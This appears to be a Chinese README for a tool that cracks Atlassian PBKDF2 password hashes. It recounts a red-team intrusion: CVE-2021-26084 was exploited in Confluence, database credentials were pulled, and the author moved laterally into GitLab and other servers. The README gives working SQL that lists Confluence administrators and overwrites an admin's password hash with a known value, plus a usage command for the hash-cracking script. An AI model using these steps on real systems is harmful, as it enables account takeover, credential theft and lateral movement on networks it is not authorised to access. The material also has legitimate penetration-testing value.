# atlassian_pbkdf2_dehash
## 初衷
atlassian confluence产品，爆发CVE-2021-26084漏洞,在一次HW项目中通过内网目标机器不出网，通过CVE-2021-26084漏洞写入公钥，拿到服务器权限。在`<confluence-home-directory>/database`
文件夹中找到数据库账号密码。一种方法是通过查找管理员，通过修改hash值登陆web管理后台。具体方法如下：
```
## 获取管理员账号，id
select u.id, u.user_name, u.active from cwd_user u
join cwd_membership m on u.id=m.child_user_id join cwd_group g on m.parent_id=g.id join cwd_directory d on d.id=g.directory_id
where g.group_name = 'confluence-administrators' and d.directory_name='Confluence Internal Directory';
## 修改密码 123123
UPDATE cwd_user SET credential = '{PKCS5S2}V1J8HcMvYsdtnETu2tjA1gFVQ1L3o+dAsNiooSAcSvpRcbkTR8K4Ha/iWgF145gk'  
WHERE id=393217; 
```

## 问题
内网IT系统内部员工账号密码一样，而修改一个confluence密码无法登陆到其他系统，给横向移动带来麻烦。通过mysql数据库账号，pbkdf2 hash值。想到通过hash碰撞到方式，获取用户明文密码。
因此编写PBKDF2(Atlassian) hash atlassian_pbkdf2_dehash 碰撞方法，获得明文密码。最终通过明文密码，拿到gitlab 用户账号密码，查找代码配置文件，拿到多台服务器，打穿内网。

## 用法
```
python3 atlassian_pbkdf2_dehash.py -p <passwordfile> -f <hashfile>
```

## 运行结果图
![image](imgmg.png)